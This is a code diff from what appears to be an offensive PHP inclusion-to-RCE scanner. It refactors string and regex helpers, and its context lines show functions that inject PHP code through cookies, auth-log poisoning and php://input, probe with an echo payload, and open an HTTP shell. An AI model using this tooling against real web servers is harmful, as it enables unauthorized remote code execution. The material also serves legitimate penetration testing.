@@ -3,6 +3,7 @@
 #include "string/urlencode.h"
 #include "string/hexdump.h"
 #include "string/diff.h"
+#include "string/concat.h"
 
 char *build_datawrap(const char *phpcode){
     char *ret, *b64, *url;
@@ -35,7 +36,7 @@ void build_rce_exploit(CURL *curl, const char *url, const char *pname,
 
         case ENVIRON:
             if(global.cookies){
-                cookieptr = cookie_append(global.cookies, phpcode);
+                cookieptr = concatl(global.cookies, "&", phpcode, NULL);
                 curl_easy_setopt(curl, CURLOPT_COOKIE, cookieptr);
                 free(cookieptr);
             } else {
@@ -69,7 +70,7 @@ bool check_auth_poison(const char *target){
     curl_easy_setopt(curl, CURLOPT_URL, target);
 
     random_string(rstr, R_SIZE);
-    build_regex(regex, rstr, "Vulnerable");
+    concatlb(regex, rstr, "Vulnerable", rstr, NULL);
     phpcode = make_code(rstr, "<?php echo \"Vulnerable\"; ?>", true);
 
     build_rce_exploit(curl, NULL, NULL, phpcode, AUTH);
@@ -240,7 +241,7 @@ int rce_scan(const char *base, struct parameter_list *plist, int p){
     CURL *curl = init_curl(&body);
 
     random_string(random_str, R_SIZE);
-    build_regex(regex, random_str, "Vulnerable");
+    concatlb(regex, random_str, "Vulnerable", random_str, NULL);
     php_code = make_code(random_str, "<?php echo 'Vulnerable'; ?>", false);
 
     info_single("testing php://input ...\n");
@@ -549,7 +550,7 @@ void exec_phpcode(const char *url, const char *parameter, const char *code, int 
     rce_code = make_code(random_string(rbuf, sizeof(rbuf)), code, (type == AUTH));
     build_rce_exploit(curl, url, parameter, rce_code, type);
 
-    build_regex(regex, rbuf, "(.*)");
+    concatlb(regex, rbuf, "(.*)", rbuf, NULL);
 
     if(http_request(curl)){
         match = regex_extract(regex, body.ptr, body.len, PCRE_DOTALL, &len);
@@ -597,7 +598,7 @@ void rce_http_shell(const char *url, const char *parameter, int technique){
     curl_easy_setopt(curl, CURLOPT_URL, url);
 
     random_string(randomstr, sizeof(randomstr));
-    build_regex(regex, randomstr, "(.*)");
+    concatlb(regex, randomstr, "(.*)", randomstr, NULL);
 
     aux = xmalloc(600);
 
